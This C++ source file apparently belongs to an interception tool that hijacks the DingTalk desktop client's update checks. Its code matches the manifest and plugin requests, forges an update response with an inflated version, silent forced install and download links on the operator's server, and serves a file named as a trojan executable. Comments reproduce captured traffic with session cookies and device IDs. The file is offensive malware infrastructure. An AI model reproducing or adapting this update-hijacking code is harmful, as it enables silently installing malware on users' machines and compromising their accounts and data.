
#include <windows.h>
#include "Dingding.h"
#include "../cipher/CryptoUtils.h"
#include "../attack.h"
#include "sslPublic.h"
#include "../Public.h"
#include "../HttpUtils.h"
#include "PluginServer.h"
#include "../FileOper.h"

//download.alicdn.com
int DingDing::isDingdingUpdate(const char * url, const char * host) {
	//im.dingtalk.com
	if (strstr(host, "im.dingtalk.com")) {
		 ///manifest/new/release_windows_vista_later_all.json
		 ///manifest/new/release_windows_vista_later_all.json
		if (strstr(url, "/manifest/new/release_windows_vista_later_all.json") || 
			strstr(url, "/manifest/release_nativeui_windows.json") || 
			strstr(url, "manifest/release_nativeui_windows_manual_check.json"))
		{
			return TRUE;
		}
	}

	return FALSE;
}

//GET download.alicdn.com/dingtalk-desktop/win_updater/networktest.exe HTTP/1.1
int DingDing::isDingdingPluginUpdate(const char *url, const char * host) {
	if (strstr(host, "download.alicdn.com"))
	{
		if (strstr(url, "/dingtalk-desktop/win_updater/") && (strstr(url, ".exe") || strstr(url,".dll") )) {
			return TRUE;
		}
	}
	return FALSE;
}

/*
GET /dingtalk-desktop/win_updater/networktest.exe HTTP/1.1
Host: download.alicdn.com
User-Agent: Win/6.2 (Windows NT;zh_CN) App/4.5.15-Release.31 AliApp(DingTalk/4.5.15-Release.31) com.dingtalk.win/1771550 Channel/201200
Accept: *//*
Cookie: up_ab=y;preview_ab=y;dt_s=u-32420e6-67bb36b304-b093c6f-791b1f-35eda934-ffefcc40-d91b-466a-bde7-afeac41d08f4
deviceid: e0984ef42f99e5a34d1ce06b1966388e
Referer: https://im.dingtalk.com/

GET /dingtalk-desktop/win_updater/networktest.exe HTTP/1.1
Host: download.alicdn.com
User-Agent: Win/6.2 (Windows NT;zh_CN) App/4.5.15-Release.31 AliApp(DingTalk/4.5.15-Release.31) com.dingtalk.win/1771550 Channel/201200
Accept: *//*
Cookie: up_ab=y;preview_ab=y;dt_s=u-32420e6-698f4b2f98-b14f9f5-31a2a9-5d5123c9-397c41ec-5888-4544-abcf-6c4d82fd8a1f
deviceid: e0984ef42f99e5a34d1ce06b1966388e
Referer: https://im.dingtalk.com/

HTTP/1.1 200 OK
Server: Tengine
Content-Type: application/octet-stream
Content-Length: 14848
Connection: keep-alive
Date: Sun, 17 Mar 2019 08:39:12 GMT
x-oss-request-id: 5C8E07B04168AD25237A226A
Accept-Ranges: bytes
ETag: "ECAB146528166DF1428FE7F285CEBAFD"
Last-Modified: Thu, 04 May 2017 02:58:34 GMT
x-oss-object-type: Normal
x-oss-hash-crc64ecma: 13773383463320915746
x-oss-storage-class: Standard
x-oss-meta-md5: ecab146528166df1428fe7f285cebafd
Cache-Control: max-age=86400
Content-MD5: 7KsUZSgWbfFCj+fyhc66/Q==
x-oss-server-time: 84
Via: cache20.l2eu6-1[38,304-0,H], cache12.l2eu6-1[39,0], cache13.cn579[0,200-0,H], cache9.cn579[1,0]
Age: 79516
Ali-Swift-Global-Savetime: 1543223069
X-Cache: HIT TCP_MEM_HIT dirn:9:48554465
X-Swift-SaveTime: Sun, 17 Mar 2019 08:39:12 GMT
X-Swift-CacheTime: 86400
Timing-Allow-Origin: *
EagleId: 7ae4fa9d15528914686504161e
*/
int DingDing::sendPlugin(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
// 	char * szHttpPartialZipFormat = "HTTP/1.1 206 Partial Content\r\n"
// 		"Connection: keep-alive\r\n"
// 		"Content-Range: bytes %u-%u/%u\r\n"
// 		"Content-Type: application/zip\r\n"
// 		"Content-Length: %u\r\n\r\n";
// 		string filename = Public::getUserUrl(lpssl->username, EXETROJAN_FILE_NAME);
// 		int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 0, -1);

	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		//"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lpssl->username, EXETROJAN_FILE_NAME);
	int ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat,1);
	return ret;
}



/*
GET /manifest/new/release_windows_vista_later_all.json HTTP/1.1
Host: im.dingtalk.com
User-Agent: Win/10.0 (Windows NT;zh_CN) App/6.0.15-Release.5170687 AliApp(DingTalk/6.0.15-Release.5170687) com.dingtalk.win/1771550 Channel/201200
Accept: *//*
Cookie: dt_s=u-32420e6-7a102217f5-b8ac7a5-946622-7d3b44bb-42defb26-3a22-474e-8fd5-7ba235df856f;up_ab=y;preview_ab=y
deviceid: 02ef66a8c7f2a9a3dcc8dbd163db0f19
Referer: https://im.dingtalk.com/

HTTP/1.1 200 OK
Server: DingTalk/1.0.0
Date: Tue, 15 Jun 2021 14:45:09 GMT
Content-Type: application/octet-stream
Content-Length: 2613
Connection: keep-alive
Last-Modified: Sat, 12 Jun 2021 02:14:02 GMT
Content-Security-Policy: default-src 'none' ; style-src 'self' 'unsafe-inline'  https://*.alicdn.com https://*.taobao.net; script-src 'unsafe-inline' 'unsafe-eval'  https://*.dingtalk.com  https://*.alicdn.com https://*.taobao.net https://ynuf.alipay.com https://ynuf.aliapp.org https://vip.laiwang.com https://wswukong.laiwang.com; connect-src 'self' wss://wswukong.laiwang.com wss://*.dingtalk.com https://ynuf.alipay.com https://ynuf.aliapp.org; frame-src *; font-src  https://*.alicdn.com https://*.taobao.net;img-src * data: blob: filesystem:; media-src https://*.alicdn.com https://*.aliimg.com https://*.taobao.net https://*.dingtalk.com; object-src 'self' https://*.alicdn.com; report-uri https://csp.dingtalk.com/csp
Accept-Ranges: bytes
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubdomains;
Cache-Control: no-cache

{
	"win": 
	{
		"install": 
		{
			"description": [""],
			"md5": "03e59905ebb73b0c1b96a5bcae73217a",
			"multi_lang_description": 
			{
				"en_US": ["Version: 6.0.18.6110187, Update Date: 2021-06-12","This update includes bug fixes and user interface improvements."],
				"ja_JP": [""],
				"zh_TW": [""]
			},
		"url": "https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v6.0.18.6110187.exe",
		"version": "6.0.18-Release.6110187"
		},

		"min_version": "0.9.90",
		"package": 
		{
			"force_silent": 1,
			"md5": "4c57f91693d2027b919637a1a829e9a7",
			"need-reinstall": "<1.10.4",
			"need-update": "<1.0.0",
			"need-update-v2": "<6.0.18-Release.6110187",
			"url": "https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_updater/Release/DingTalkUpdate_v6.0.18.6110187.zip",
			"version": "6.0.18-Release.6110187"
		}
	}
}

GET /manifest/release_nativeui_windows.json HTTP/1.1
Host: im.dingtalk.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36 dingtalk-win/1.0.0 nw(0.14.7) DingTalk(4.5.15-Release.31) Mojo/1.0.0 Native AppType(release)
Accept: *//*
Cookie: 

HTTP/1.1 200 OK
Server: DingTalk/1.0.0
Date: Mon, 18 Mar 2019 06:44:28 GMT
Content-Type: application/octet-stream
Content-Length: 2102
Connection: keep-alive
Last-Modified: Thu, 14 Mar 2019 14:36:46 GMT
Content-Security-Policy: default-src 'none' ; style-src 'self' 'unsafe-inline'  https://*.alicdn.com https://*.taobao.net;script-src 'unsafe-inline' 'unsafe-eval'  https://*.dingtalk.com  https://*.alicdn.com https://*.taobao.net https://ynuf.alipay.com https://vip.laiwang.com https://wswukong.laiwang.com; connect-src 'self' wss://wswukong.laiwang.com wss://*.dingtalk.com https://ynuf.alipay.com https://ynuf.aliapp.org; frame-src *; font-src  https://*.alicdn.com https://*.taobao.net;img-src * data: blob: filesystem:; media-src https://*.alicdn.com https://*.aliimg.com https://*.taobao.net https://*.dingtalk.com; object-src 'self' https://*.alicdn.com; report-uri https://csp.dingtalk.com/csp
Accept-Ranges: bytes
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubdomains;
Cache-Control: no-cache

{
  "win": {  
    "web_content": {
      "url": "https://download.alicdn.com/dingtalk-desktop/native_web_content/Release/NativeWebContent_v4.6.15.28.zip",
      "md5": "fd2144b4c6f8496d84312dc3963c60f6",
      "require_nw": ">=4.6.16-Release.5101",
      "description": []
    },
    "min_version": "0.9.90",
    "install": {
      "version": "4.6.16-Release.5101",
      "url": "https://download.alicdn.com/dingtalk-desktop/win_installer/Release/DingTalk_v4.6.16.5101.exe",
      "md5": "d1dc08bb77e577f49d08c6f87f380897",
      "description": [
        "版本号：4.6.16.5101 更新日期�?019-03-11",
        "点赞支持合并收起，群内消息一目了然；",
        "可以创建周期性日程了，轻松设置日会、周会等定时提醒�?
      ],
      "multi_lang_description": {
        "zh_TW": [
          "版本號：4.6.16.5101，更新日期：2019-03-11",
          "點贊支持合併收起，群內消息一目了然；",
          "可以創建週期性日程了，輕鬆設定日會、周會等定時提醒�?
        ],
        "en_US": [
          "Version: 4.6.16.5101, Update Date: 2019-03-11",
          "Organize chat contents with collapsible likes.",
          "You can create recurring events and schedule daily or weekly meetings with reminders."
        ],
        "ja_JP": [
          "バージョン：4.6.16.5101，更新日時：2019-03-11",
          "いい�?をまとめて折りたたみ、グループチャットメッセージが一目瞭然に",
          "定例周期日程が作成出来るようになりました、簡単に毎日の会議や、週会などの定時通知が設定可能に"
        ]
      }
    },
    "package": {
      "version": "4.6.16-Release.5101",
      "url": "https://download.alicdn.com/dingtalk-desktop/win_updater/Release/DingTalkUpdate_v4.6.16.5101.zip",
      "md5": "47d48fed71125c71071ac6f366afbbfa",
      "need-update": "<1.0.0",
      "need-update-v2": "<4.6.16-Release.5101",
      "need-reinstall": "<1.10.4",
      "force_silent": 1
    }
  }
}
*/



int DingDing::makeReponse(char * dstbuf, int len, int dstbuflimit, LPSSLPROXYPARAM pstSSLProxyParam) {
	int ret = FALSE;

	string version = "99.10.4-Release.31";		//4

	char * lpRespFormat =
"HTTP/1.1 200 OK\r\n"
"Server: DingTalk/1.0.0\r\n"
"Content-Type: application/octet-stream\r\n"
"Content-Length: %u\r\n"
"Connection: keep-alive\r\n"
"Content-Security-Policy: default-src \'none\' ; style-src \'self\' \'unsafe-inline\'  https://*.alicdn.com https://*.taobao.net; script-src \'unsafe-inline\' \'unsafe-eval\'  https://*.dingtalk.com  https://*.alicdn.com https://*.taobao.net https://ynuf.alipay.com https://ynuf.aliapp.org https://vip.laiwang.com https://wswukong.laiwang.com; connect-src \'self\' wss://wswukong.laiwang.com wss://*.dingtalk.com https://ynuf.alipay.com https://ynuf.aliapp.org; frame-src *; font-src  https://*.alicdn.com https://*.taobao.net;img-src * data: blob: filesystem:; media-src https://*.alicdn.com https://*.aliimg.com https://*.taobao.net https://*.dingtalk.com; object-src 'self' https://*.alicdn.com; report-uri https://csp.dingtalk.com/csp\r\n"
"Accept-Ranges: bytes\r\n"
"X-Content-Type-Options: nosniff\r\n"
"X-XSS-Protection: 1; mode=block\r\n"
"Strict-Transport-Security: max-age=31536000; includeSubdomains; \r\n"
"Cache-Control: no-cache\r\n\r\n%s";

	//char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	string ip = HttpUtils::getIPstr(gServerIP) + "/" + pstSSLProxyParam->username;

	char * retformat =
		"{\r\n"
		 "\"win\": {\r\n"

// 		"\"web_content\": {\r\n"
// 		"\"url\": \"http://%s/%s\", \r\n"
// 		"\"md5\": \"%s\", \r\n"
// 		"\"require_nw\": \">=%s\",\r\n"
// 		"\"description\": [\"update\"]\r\n"
// 		"},\r\n"

		"\"min_version\": \"0.1.90\", \r\n"

		"\"install\": {\r\n"
		"\"version\": \"%s\", \r\n"
		"\"url\": \"http://%s/%s\", \r\n"
		"\"md5\": \"%s\", \r\n"
		"\"description\": [\"update\"], \r\n"
		"\"multi_lang_description\": {\r\n"
		"\"zh_TW\": [\"update\"], \r\n"
		"\"en_US\": [\"update\"], \r\n"
		"\"ja_JP\": [\"update\"]\r\n"
		"}\r\n"
		"}, \r\n"

		"\"package\": {\r\n"
		"\"version\": \"%s\", \r\n"
		"\"url\": \"http://%s/%s\", \r\n"
		"\"md5\": \"%s\", \r\n"
		"\"need-update\": \"<0.1.4\", \r\n"
		"\"need-update-v2\": \"<%s\", \r\n"
		"\"need-reinstall\": \"<0.1.4\"\r\n"
		"\"force_silent\": 1\r\n"
		"}\r\n"
		"}\r\n"
		"}\r\n";

	string exefn = Public::getUserPluginPath(pstSSLProxyParam->username) + DINGDINGUPDATE_EXE_FILENAME;
	string newexefn = exefn + "_new";
	ret = FileOper::fileDecryptWriter(exefn, newexefn);
	if (ret <= 0)
	{
		return FALSE;
	}

	string zipfn = Public::getUserPluginPath(pstSSLProxyParam->username) + DINGDINGUPDATE_ZIP_FILENAME;
	ret = Public::zipFile(DINGDINGUPDATE_EXE_FILENAME, newexefn, zipfn);
	if (ret == 0)
	{
		return FALSE;
	}



	char zipmd5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	int zipfs = CryptoUtils::getUpdateFileMd5(zipfn, zipmd5, hexmd5, TRUE);

	char exemd5[256] = { 0 };
	int exefs = CryptoUtils::getUpdateFileMd5(exefn, exemd5, hexmd5, TRUE);

	char result[0x2000];
	int retlen = sprintf(result, retformat, 
		
		//ip.c_str(), DINGDINGUPDATE_ZIP_FILENAME,zipmd5,version.c_str(),
		version.c_str(), ip.c_str(), DINGDINGUPDATE_EXE_FILENAME, exemd5,
		version.c_str(),ip.c_str(), DINGDINGUPDATE_ZIP_FILENAME, zipmd5,version.c_str());

	//char tmpbuf[0x2000];
	//int tmplen = sprintf_s(tmpbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

	//int responseLen = MultiByteToWideChar(CP_ACP,0,tmpbuf, tmplen, (wchar_t*)dstbuf, dstbuflimit/2);
	//int responseLen = Public::GBKToUTF8(tmpbuf, tmplen, dstbuf, dstbuflimit);
	int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);
	return responseLen;
}


/*
GET /manifest/release_nativeui_windows_manual_check.json HTTP/1.1
Host: im.dingtalk.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36 dingtalk-win/1.0.0 nw(0.14.7) DingTalk(4.2.8-Release.40) Mojo/1.0.0 Native
Accept: *//*
Cookie:
*/